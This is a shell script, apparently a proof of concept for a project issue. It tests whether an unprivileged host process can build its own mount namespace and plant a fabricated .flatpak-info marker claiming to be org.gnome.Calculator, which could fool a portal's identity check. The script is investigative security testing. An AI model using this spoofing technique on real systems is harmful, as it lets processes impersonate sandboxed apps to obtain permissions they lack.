# Issue #149: can an unprivileged process make
# /proc/<pid>/root/.flatpak-info say whatever it likes?
#
# The portal reads that path to learn a Flatpak app's identity. For a
# real sandboxed app the marker is trustworthy — the app cannot edit it
# from inside. The question is what it says about a HOST process that
# creates its own mount namespace. The issue was filed from reading the
# code; nobody had asked the kernel.
set -u

unshare -Umr --propagation private sh -c '
  mkdir -p /tmp/newroot
  mount -t tmpfs none /tmp/newroot || { echo TMPFS-FAILED; exit 1; }
  mkdir -p /tmp/newroot/usr /tmp/newroot/old /tmp/newroot/proc /tmp/newroot/tmp
  mount --bind /usr /tmp/newroot/usr || { echo BIND-FAILED; exit 1; }
  ln -s usr/bin /tmp/newroot/bin
  ln -s usr/lib /tmp/newroot/lib
  ln -s usr/lib /tmp/newroot/lib64
  # The fabricated marker: a host process claiming to be a sandboxed app.
  printf "[Application]\nname=org.gnome.Calculator\n" > /tmp/newroot/.flatpak-info
  cd /tmp/newroot && pivot_root . old || { echo PIVOT-FAILED; exit 1; }
  echo $$ > /old/tmp/ns-poc.pid
  /usr/bin/sleep 15
' &

sleep 3
PID=$(cat /tmp/ns-poc.pid 2>/dev/null)
echo "namespaced pid: ${PID:-none}"
if [ -n "${PID:-}" ]; then
  echo "--- what the portal would read, /proc/$PID/root/.flatpak-info:"
  cat "/proc/$PID/root/.flatpak-info" 2>&1 | head -3
  echo "--- what the kernel says was executed, /proc/$PID/exe:"
  readlink "/proc/$PID/exe" 2>&1
fi
wait
